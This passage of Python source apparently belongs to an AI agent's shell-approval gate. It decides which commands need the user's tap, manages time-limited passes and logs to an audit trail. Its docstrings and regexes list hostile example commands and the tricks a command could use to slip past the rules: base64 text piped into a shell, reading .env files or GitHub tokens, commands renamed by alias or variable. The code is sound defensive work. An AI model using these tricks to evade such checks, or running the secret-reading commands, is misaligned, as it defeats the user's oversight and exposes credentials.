    if group in _GH_HELP or group in _GH_FREE_GROUPS:
        return True
    if action in GH_READS.get(group, frozenset()):
        return True
    return group == "api" and gh_api_reads_only(rest)


def gh_auth_reasons(args: list[str]) -> list[str]:
    """Why a `gh auth …` command asks (the words after `auth`): status without its token runs free; token, status
    showing the token, or anything this reading doesn't know asks as reading secrets; login, refresh and switch talk to
    GitHub with his credentials (sending out); logout deletes them too.
      [] -> [];  ["status"] -> [];  ["status", "-h", "github.com"] -> [];  ["status", "-t"] -> ["reads secrets"];
      ["token"] -> ["reads secrets"];  ["login"] -> ["sends data out"];  ["logout"] -> ["deletes or stops something",
      "sends data out"];  ["setup-git"] -> ["reads secrets"]."""
    if not args:
        return []  # its help
    action = args[0]
    if action == "status":
        if gh_auth_status_plain(args[1:]):
            return []
        return [READS_SECRETS]
    if action in ("login", "refresh", "switch"):
        return [SENDS_OUT]
    if action == "logout":
        return [DELETES, SENDS_OUT]
    return [READS_SECRETS]


def gh_auth_status_plain(args: list[str]) -> bool:
    """Whether `gh auth status`'s options are only ones that keep the token hidden (-a, --active, -h/--hostname X).
    [] -> True;  ["-h", "github.com"] -> True;  ["--hostname=github.com"] -> True;  ["-t"] -> False;
    ["--show-token"] -> False;  ["-at"] -> False;  ["--json", "hosts"] -> False (an option it doesn't know)."""
    at = 0
    while at < len(args):
        word = args[at]
        at += 1
        name = word.split("=", 1)[0]
        if word in _GH_AUTH_STATUS_FLAGS:
            continue
        if name in _GH_AUTH_STATUS_VALUES:
            if "=" not in word:
                at += 1  # its value is the next word
            continue
        return False
    return True


def gh_api_method(args: list[str]) -> str:
    """The method a `gh api` command names (-X / --method, joined or not), in capitals, or "" when it names none:
    ["-X", "delete", "x"] -> "DELETE";  ["-XPOST", "x"] -> "POST";  ["--method=GET", "x"] -> "GET";  ["x"] -> ""."""
    method = ""
    at = 0
    while at < len(args):
        word = args[at]
        at += 1
        if word in ("-X", "--method") and at < len(args):
            method = args[at]
            at += 1
        elif word.startswith(("-X=", "--method=")):
            method = word.split("=", 1)[1]
        elif word.startswith("-X"):
            method = word[2:]
    return method.upper()


def gh_api_reads_only(args: list[str]) -> bool:
    """Whether a `gh api` command (the words after `api`) is a plain GET of one address: no method but GET, no
    fields, input or headers (-f, -F, --field, --raw-field, --input, -H), not graphql, and only options this reading
    knows (_GH_API_FLAGS, _GH_API_VALUES), so the whole command is read exactly.
      ["repos/a/b/pulls"] -> True;  ["-X", "GET", "repos/a/b", "--jq", ".[].title"] -> True;  ["--paginate",
      "repos/a/b/issues"] -> True;  ["-X", "POST", "repos/a/b/issues"] -> False;  ["repos/a/b", "-f", "x=1"] -> False;
      ["graphql", "-f", "query=…"] -> False;  ["-XDELETE", "repos/a/b"] -> False;  ["-iXPOST", "x"] -> False;
      ["-H", "X-HTTP-Method-Override: DELETE", "x"] -> False;  ["a", "b"] -> False (two addresses);
      ["https://example.com/x"] -> False (another host);  ["https://api.github.com/user"] -> True."""
    addresses = []
    at = 0
    while at < len(args):
        word = args[at]
        at += 1
        if not word.startswith("-") or word == "-":
            addresses.append(word)
            continue
        name = word.split("=", 1)[0]
        if name in _GH_API_FLAGS and "=" not in word:
            continue
        if name not in _GH_API_VALUES:
            if word.startswith("-X") and word[2:].upper() == "GET":
                continue  # -XGET
            return False
        value = ""
        if "=" in word:
            value = word.split("=", 1)[1]
        elif at < len(args):
            value = args[at]
            at += 1
        if name in ("-X", "--method") and value.upper() != "GET":
            return False
    if len(addresses) != 1 or addresses[0] == "graphql":
        return False
    address = addresses[0]
    return "://" not in address or address.startswith("https://api.github.com/")  # GitHub's API, not another host


# Where a word is the command itself: the start of the text or of a piece, after $( ( { ` ! or a shell's -c, after
# then / do / else / if / while / until or find's -exec, past NAME=value words and the wrappers that run what follows.
_COMMAND_START = (r"(?:^|[;&|({`!\n]|\$\(|\b(?:then|do|else|elif|if|while|until)\s|\s-(?:exec|execdir|ok|okdir)\s|"
                  r"\b(?:sh|bash|zsh|dash|ksh|fish)\s+(?:-\w+\s+)*-\w*c\s+[\"']?)\s*"
                  r"(?:(?:\w+=\S*|command|builtin|exec|nohup|time|env|nice|noglob|nocorrect|xargs|sudo|uv\s+run|uvx|"
                  r"pipx\s+run|-\S+)\s+)*")
# The odie command's own subcommands (odie/cli.py): `odie` followed by one of them is Odie's command wherever it stands
# (timeout 5 odie chat …, watch odie status).
ODIE_SUBCOMMANDS = ("start", "stop", "restart", "status", "pair", "logs", "open", "update", "doctor", "uninstall",
                    "serve", "write-command", "chat", "threads", "show")
# Odie's command: `odie …` where a command stands (or opening a quoted line, as AppleScript's do shell script "odie …"),
# followed by one of its subcommands anywhere, by a path to a bin folder (~/.local/bin/odie, .venv/bin/odie), or its
# Python module (python -m odie.cli).
_ODIE_COMMAND = re.compile(
    _COMMAND_START + r"[\"']?(?:\S*/)?odie(?=$|[\s;&|)`'\"<>])|[\"']odie(?=$|[\s;&|)`'\"<>])|/bin/odie(?![\w.-])|"
    r"\bodie\.cli\w*\b|(?<![\w./-])odie\s+(?:" + "|".join(ODIE_SUBCOMMANDS) + r")(?=$|[\s;&|)`'\"<>])|"
    r"\bpython[\d.]*\s+(?:-\S+\s+)*\S*odie/cli\w*\.py\b", re.MULTILINE)
# A command whose name is filled in at run time: `$G repo delete`, `"${X}" x`, `$(which gh) …`, `` `which rm` x ``.
_NAMED_AT_RUN_TIME = re.compile(_COMMAND_START + r"[\"']?(?:\$(?!HOME\b|\{HOME\}|\(\()[{\w(~=!#@*?-]|`)", re.MULTILINE)
# Giving a command another name: an alias or hash entry (alias g=gh), a git alias (git -c alias.p=push p), or its path
# taken at run time to copy or run it under another name (cp $(which gh) /tmp/x; /tmp/x repo delete y).
_RENAMES_A_COMMAND = re.compile(r"\b(alias|hash)\s+(?:-\w+\s+)*['\"]?[\w.:-]+=|\bgit\b[^|;&\n]*\balias\.|"
                                r"(?:\$\(|`)\s*(?:which|whence|whereis|type|command\s+-[vV])\b")
_SHELL_HEREDOC = re.compile(r"\b(sh|bash|zsh|dash|ksh|fish)\b[^|;&\n]*<<")


def runs_odie(text: str) -> bool:
    """Whether the text runs Odie's own command, which could drive its chat, change it or stop it: `odie chat hi` ->
    True;  `sh -c "odie threads"` -> True;  `~/.local/bin/odie status` -> True;  `python -P -m odie.cli show x` ->
    True;  `cd ~/work/odie && ls` -> False;  `grep -rn x odie` -> False (a folder named odie);  `ls odie-mac` -> False."""
    return _ODIE_COMMAND.search(text) is not None


def command_hidden_by_name(shell: str, code: str = "") -> bool:
    """Whether the command runs something whose name the rules can't read: a command named by a variable or a
    substitution, or a name given by alias, hash or a git alias. Heredoc code counts only when a shell reads it (a
    node template's `${x}` is not a command).
      `G=gh; $G repo delete x` -> True;  `"$R" -rf x` -> True;  `$(which gh) repo delete x` -> True;
      `alias g=gh` -> True;  `git -c alias.p=push p` -> True;  `echo "$X"` -> False;  `$HOME/bin/tool x` -> False;
      `echo $((1 + 2))` -> False;  `bash <<'EOF'` + `$R x` -> True;  `node <<'EOF'` + `` `${a}` `` -> False."""
    texts = [shell]
    if code and _SHELL_HEREDOC.search(shell):
        texts.append(code)
    for text in texts:
        if _NAMED_AT_RUN_TIME.search(text) or _RENAMES_A_COMMAND.search(text):
            return True
    return False


def named_command_reasons(shell: str, code: str) -> list[str]:
    """The reasons the gh, odie and named-at-run-time readings find in a command, read as written and squeezed, each
    once: `gh repo delete x` -> ["deletes or stops something", "sends data out"];  `odie chat hi` -> ["runs Odie itself
    (its own command)"];  `g''h auth token` -> ["reads secrets"];  `gh pr view 3` -> []."""
    reasons: list[str] = []
    text = f"{shell}\n{code}"
    for reading in (text, squeezed(text)):
        found = []
        for args in gh_commands(reading):
            found.extend(gh_reasons(args))
        if runs_odie(reading):
            found.append(RUNS_ODIE)
        for why in found:
            if why not in reasons:
                reasons.append(why)
    hidden = command_hidden_by_name(shell, code) or command_hidden_by_name(squeezed(shell), squeezed(code))
    if hidden and RUNS_TEXT not in reasons:
        reasons.append(RUNS_TEXT)
    return reasons


def always_ask(command: str, safe_dirs: tuple[str, ...] = (), cwd: str | None = None,
               scratch_dirs: tuple[str, ...] = (), smart: bool = False, own_port: int | None = None,
               odie_dirs: tuple[str, ...] = ()) -> str | None:
    """Why this command must be tapped even under a grant (the first of reasons_to_ask), or None if a grant covers it:
    `ls ~/Downloads` -> None; `rm old.txt` -> "deletes or stops something"; Smart, `crontab -l` -> None."""
    reasons = reasons_to_ask(command, safe_dirs, cwd, scratch_dirs, smart, own_port, odie_dirs)
    if not reasons:
        return None
    return reasons[0]


def reasons_to_ask(command: str, safe_dirs: tuple[str, ...] = (), cwd: str | None = None,
                   scratch_dirs: tuple[str, ...] = (), smart: bool = False, own_port: int | None = None,
                   odie_dirs: tuple[str, ...] = ()) -> list[str]:
    r"""Every reason this command must be tapped, in the order the rules find them (each once); [] when none. The rules
    read the shell text and any code fed to an interpreter (split_heredocs), as written and with spelling tricks
    squeezed out (squeezed); a hidden path reached by a pattern asks (hidden_path_by_pattern); file writes are judged
    from the shell text, with Odie's workspace and the vault (`safe_dirs`) as safe as /tmp. The rules can't read every
    shell (a script written to the workspace and then run is its own code): they close the ways a command hides what it
    does, not every command. Examples: `ls ~/Downloads` -> []; `rm old.txt` -> ["deletes or stops something"];
    `echo hi > /tmp/x` -> []; `echo hi > notes.txt` -> ["writes a file outside /tmp"]; `python3 -c "import PIL"` -> [];
    `python3 -c "import shutil; shutil.rmtree(p)"` -> ["deletes or stops something"]; `echo aWQ= | base64 -d | zsh` ->
    ["runs text as commands"]; `cat ~/.e?nv` -> ["reads secrets"]; `npm install left-pad` -> ["installs software (runs
    its install scripts)"]; `rm x && brew install y` -> ["deletes or stops something", "installs software (runs its
    install scripts)"].
    Ordinary work is read plainly first (16 Nov 2026): grep patterns are words, scratch deletes in /tmp or the workspace
    (`scratch_dirs`) and the project's own npx tool are blanked (ordinary_work_blanked), a \x escape asks only when it
    could spell a command (hex_spells_code), and code run from a safe place that writes there is a plain write
    (code_writes_stay_here): `rm -f /tmp/pr12-*.log` -> []; `grep "a\|source" README.md` -> [].
    `smart` (17 Nov 2026) reads seven kinds of ordinary work plainly too, in Smart mode only: reading Odie's code
    (reads_only_odies_code), a pipe into a program written in the command and find's -prune (smart_blanked), reading
    what runs at login and sending to this computer except Odie's own port `own_port` (smart_views), and a new file in
    an ordinary folder outside `odie_dirs` (write_reason). Careful's pass reads every command as before.
    In both modes (18 Nov 2026) gh runs free only for plain reads, `odie` always asks, and a command named at run time or
    renamed by an alias asks (named_command_reasons): `gh pr view 3` -> []; `gh repo delete x` -> ["deletes or stops
    something", "sends data out"]; `odie chat hi` -> ["runs Odie itself (its own command)"]; `G=gh; $G repo delete x`
    -> ["runs text as commands"]."""
    shell, code = split_heredocs(command)
    reasons: list[str] = []

    def note(why: str) -> None:
        if why not in reasons:
            reasons.append(why)

    if hex_spells_code(f"{shell}\n{code}"):
        note("runs text as commands")
    shell_read = ordinary_work_blanked(search_patterns_blanked(shell), scratch_dirs, cwd)
    views: dict[str, str] = {}
    if smart:
        shell_read = smart_blanked(shell, shell_read, code, cwd)
        views = smart_views(shell, shell_read, own_port)
    writes_stay_here = code_writes_stay_here(shell, code, safe_dirs, cwd)
    for squeeze in (False, True):
        for why, rule in _RULES:
            if why == "writes a file from code" and writes_stay_here and not rule.search(squeezed(shell_read)):
                continue  # the heredoc writes where it runs, in a safe place: like `cat > notes.md` there
            text = f"{views.get(why, shell_read)}\n{code}"
            if squeeze:
                text = squeezed(text)
            if rule.search(text):
                note(why)
    for why in named_command_reasons(shell_read, code):
        note(why)  # gh, odie, and a command named at run time (18 Nov 2026)
    if hidden_path_by_pattern(shell_read, safe_dirs):
        note("reaches a hidden file by a pattern")
    write_why = write_reason(shell_read, safe_dirs, cwd, smart, odie_dirs, code)
    if write_why is not None:
        note(write_why)
    landing_why = destination_reason(shell, cwd, safe_dirs, odie_dirs)
    if landing_why is not None:
        note(landing_why)
    looked_at = f"{shell_read}\n{code}"
    if cwd:
        looked_at = f"{cwd}\n{looked_at}"  # a command run in Odie's home touches it without naming it
    touched = touches_odie_home(looked_at) or touches_odie_home(squeezed(looked_at))
    touched = touched or names_odie_home_by_path(shell, cwd, safe_dirs, odie_dirs)
    if touched and not (smart and reads_only_odies_code(shell, code, cwd)):
        note("touches Odie's own files")
    return reasons


# Passes live only in the running server's memory (17 Nov 2026 review): code that writes Odie's database could plant
# one there, so nothing written to disk can make one. A restart ends them all.
_GRANTS: dict[str, datetime] = {}  # chat id -> until: Careful's 'Allow for 30 min'
_KIND_PASSES: dict[tuple[str, str], datetime] = {}  # (chat id, kind) -> until: "don't ask again in this chat"


def grant(session_id: str, now: datetime, minutes: int = GRANT_MINUTES) -> datetime:
    """Careful's 'Allow for 30 min' for this chat, until now + minutes (in memory only); returns that time."""
    until = now + timedelta(minutes=minutes)
    _GRANTS[session_id] = until
    return until


def active(session_id: str, now: datetime) -> bool:
    """Is this chat's 'Allow for 30 min' pass still running? Granted at 10:00 -> True at 10:29, False at 10:31;
    never granted, or Odie restarted since -> False."""
    until = _GRANTS.get(session_id)
    return until is not None and believable_until(until, now)


def believable_until(until: datetime, now: datetime) -> bool:
    """Whether a pass's end time means a running pass: after now, and no later than a pass could ever run
    (GRANT_MINUTES from now). now 10:00: 10:29 -> True; 09:59 -> False; 2099-01-01 -> False."""
    return now < until <= now + timedelta(minutes=GRANT_MINUTES)


def forget_chat(session_id: str) -> None:
    """Drop every pass of this chat (its thread was erased)."""
    _GRANTS.pop(session_id, None)
    for key in [k for k in _KIND_PASSES if k[0] == session_id]:
        del _KIND_PASSES[key]


def forget_all() -> None:
    """Drop every pass (what a restart does; tests start from here)."""
    _GRANTS.clear()
    _KIND_PASSES.clear()


# ── "Don't ask again in this chat" (17 Nov 2026) ────────────────────────────────────────────────────────────────────
# In Smart, a shell card's second button lets that kind of command (the reason on the card) run without asking in that
# chat only, for GRANT_MINUTES. Kept in memory (_KIND_PASSES); erasing a thread (personalities.erase_rows_of) drops its
# passes (forget_chat), and a restart ends them.

CHAT_PASS = "allowed for this chat"
# The kinds a pass may cover. Reading secrets, changing Odie itself, switching off another agent's approvals, sending
# data out and a hidden path reached by a pattern are not here: those always ask. Nor (17 Nov 2026 review) running text
# as commands or installing software: either can do anything, reading secrets and sending them too, so a pass for one
# would cover all.
PASSABLE = frozenset({"deletes or stops something", "writes a file from code",
                      "sets something to run later or at login", "edits files in place", OUTSIDE, REPLACES})


def may_pass(kind: str | None) -> bool:
    """Whether a card asking for this reason may offer "don't ask again in this chat": "deletes or stops something" ->
    True; "replaces a file" -> True; "installs software (runs its install scripts)" -> False; "runs text as commands"
    -> False; "reads secrets" -> False; "sends data out" -> False;
    "touches Odie's own files" -> False; None, or a reason this list doesn't know -> False."""
    return kind in PASSABLE


def grant_kind(session_id: str, kind: str, now: datetime, minutes: int = GRANT_MINUTES) -> datetime:
    """Let commands of this kind run in this chat without asking until now + minutes (in memory only); returns that
    time. A kind that may never have a pass (may_pass) is refused with ValueError and nothing is kept."""
    if not may_pass(kind):
        raise ValueError(f"No pass for {kind!r}.")
    until = now + timedelta(minutes=minutes)
    _KIND_PASSES[(session_id, kind)] = until
    return until


def kinds_passed(session_id: str, now: datetime) -> set[str]:
    """The kinds this chat has a running pass for, each with its own time. Deletes passed at 10:00 ->
    {"deletes or stops something"} at 10:29, set() at 10:31; another chat -> set(); after a restart -> set()."""
    running = set()
    for (chat, kind), until in _KIND_PASSES.items():
        if chat == session_id and believable_until(until, now) and may_pass(kind):
            running.add(kind)
    return running


def card_offer(store: Store, session_id: str, command: str, cwd: str | None, now: datetime) -> dict[str, Any]:
    """What a Smart shell card says about the pass: the reason it asks (the first kind this chat has no pass for) and
    whether its second button is offered: only when that is the command's one missing kind and it may have a pass.
    Careful: {} (its card is as it always was).
      `rm old.txt` -> {"asks_because": "deletes or stops something", "chat_pass": True};
      `cat ~/.env` -> {"asks_because": "reads secrets", "chat_pass": False};
      `rm a && brew install b` -> {"asks_because": "deletes or stops something", "chat_pass": False} (two kinds; one
      pass covers one), and with deletes already passed -> {"asks_because": "installs software (…)", "chat_pass": False}
      (installing may never have one)."""
    if not approvals_mode.is_smart(store):
        return {}
    missing = _missing_kinds(store, session_id, command, cwd, now, smart=True)
    if not missing:
        return {"asks_because": None, "chat_pass": False}
    offered = len(missing) == 1 and may_pass(missing[0])
    return {"asks_because": missing[0], "chat_pass": offered}


def _reasons_for(store: Store, command: str, cwd: str | None, smart: bool) -> list[str]:
    """reasons_to_ask with this install's places: the workspace and vault, Odie's own port and folders."""
    return reasons_to_ask(command, safe_dirs=safe_places(store), cwd=cwd, scratch_dirs=scratch_places(), smart=smart,
                          own_port=_own_port(), odie_dirs=odie_places())


def _missing_kinds(store: Store, session_id: str, command: str, cwd: str | None, now: datetime,
                   smart: bool) -> list[str]:
    """The reasons this command asks (as the mode reads it) that no pass of this chat covers; only Smart has chat
    passes: Smart, `rm a && brew install b` with deletes passed -> ["installs software (runs its install scripts)"]."""
    reasons = _reasons_for(store, command, cwd, smart)
    if not smart:
        return reasons
    passed = kinds_passed(session_id, now)
    return [why for why in reasons if why not in passed]


def calls_allowed_for_chat(store: Store, session_id: str) -> set[str]:
    """The ids of the shell calls in this chat that ran under a pass for their kind (from the audit log), so their step
    says "allowed for this chat": {"c7"} after `rm old.txt` ran as c7 under a deletes pass; set() in a chat with none."""
    rows = store.query("select args_json from audit_log where session_id=? and event='shell_auto_approved' "
                       "and result_summary like ?", (session_id, f"{CHAT_PASS}%"))
    calls = set()
    for row in rows:
        try:
            args = json.loads(row["args_json"] or "{}")
        except ValueError:
            continue
        if isinstance(args, dict) and args.get("call_id"):
            calls.add(args["call_id"])
    return calls


def safe_places(store: Store) -> tuple[str, ...]:
    """Where a pass lets commands write besides /tmp: Odie's workspace, and the user's vault when one is set."""
    from odie import config
    from odie.vault import settings as vault_settings
    places = [str(config.settings.data_dir / "workspace")]
    vault = vault_settings.get(store).get("dir")
    if vault:
        places.append(str(vault))
    return tuple(places)


def scratch_places() -> tuple[str, ...]:
    """Where a delete needs no tap (with /tmp): Odie's own workspace, never the vault (its notes are the user's)."""
    from odie import config
    return (str(config.settings.data_dir / "workspace"),)


def _own_port() -> int:
    """The port Odie itself answers on (a POST there always asks)."""
    from odie import config
    return config.settings.port


def odie_places() -> tuple[str, ...]:
    """Odie's own folders, which a Smart write never counts as ordinary however they are named: its data folder, its
    settings folder and its home (~/.odie, or $ODIE_HOME)."""
    from odie import config
    home = os.environ.get("ODIE_HOME") or "~/.odie"
    return (str(config.settings.data_dir), str(config.settings.config_dir), os.path.expanduser(home))


def make_check(store: Store, clock: Callable[[], datetime] = datetime.now) -> Callable[..., bool]:
    """require_confirmation for run_shell: True means show the user the card."""
    def needs_tap(command: str = "", cwd: str | None = None, tool_context: Any = None, **_: Any) -> bool:
        """Does this shell command need the user's tap? Decided in four steps:
        1. Careful mode and no 'Allow for 30 min' pass in this chat (or it ran out) -> ask (the card). In Smart mode
           the pass isn't needed: the mode is read from the store on every call, so a flip mid-chat counts at once.
        2. A pass or Smart, and an ordinary command (no reason to ask: reasons_to_ask, read plainly in Smart) -> run it
           without a card, and note it in the audit log.
        3. Smart, and every reason it asks for has a running "don't ask again in this chat" pass (kinds_passed) -> run
           it, and note "allowed for this chat (<kinds>)" with the call's id, so its step can say so.
        4. Otherwise -> ask, and note the first reason no pass covers in the audit log.

        Examples:
          `ls ~/Downloads`, Careful, no pass -> card
          `ls ~/Downloads`, with a pass      -> runs, no card ("allowed for 30 min")
          `rm old.txt`, with a pass          -> card anyway ("deletes or stops something")
          `cat ~/.env`, with a pass          -> card anyway ("reads secrets")
          `ls ~/Downloads`, Smart, no pass   -> runs, no card ("allowed by smart mode")
          `crontab -l`, Smart                -> runs, no card (reading what runs at login)
          `rm old.txt`, Smart                -> card ("deletes or stops something")
          `rm old.txt`, Smart, deletes allowed for this chat -> runs ("allowed for this chat (deletes or stops …)")
          `brew install x`, Smart, deletes allowed for this chat -> card ("installs software (runs its install scripts)")
          `ls ~/Downloads`, Smart, a mail read this turn -> runs, no card (mail no longer counts)
        """
        session_id = session_id_of(tool_context)
        if not session_id:
            return True  # outside a chat there is no pass to look up
        smart = approvals_mode.runs_free(store, session_id)  # Smart mode
        if not smart and not active(session_id, clock()):
            return True  # Careful, and no pass or it ran out

        reasons = _reasons_for(store, command, cwd, smart)
        passed = set()
        if smart:
            passed = kinds_passed(session_id, clock())
        missing = [why for why in reasons if why not in passed]
        audit_args = {"command": command, "cwd": cwd}
        if missing:
            store.audit("agent", "shell_asked_under_grant", tool="run_shell", args=audit_args,
                        result_summary=missing[0], session_id=session_id)
            return True

        allowed_because = "allowed for 30 min"
        if smart:
            allowed_because = "allowed by smart mode"
        if reasons:  # every one covered by this chat's passes
            allowed_because = f"{CHAT_PASS} ({', '.join(reasons)})"
            audit_args["call_id"] = getattr(tool_context, "function_call_id", None)
        store.audit("agent", "shell_auto_approved", tool="run_shell", args=audit_args,
                    result_summary=allowed_because, session_id=session_id)
        return False
    return needs_tap
